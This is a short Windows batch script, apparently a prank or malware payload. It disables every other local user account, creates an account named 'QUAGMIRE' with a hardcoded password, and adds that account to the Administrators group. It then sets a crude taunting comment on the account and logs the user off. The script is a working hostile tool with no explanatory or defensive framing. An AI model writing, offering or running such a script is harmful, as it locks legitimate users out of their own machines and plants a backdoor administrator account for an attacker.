@echo off
for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        net user "!trim!" /active:no
    )
    endlocal

    
)
net user "QUAGMIRE" imh0rny44 /add
net localgroup Administrators "QUAGMIRE" /add
net user "QUAGMIRE" /comment:"FUCKED BY GIGGITY FILES"
logoff
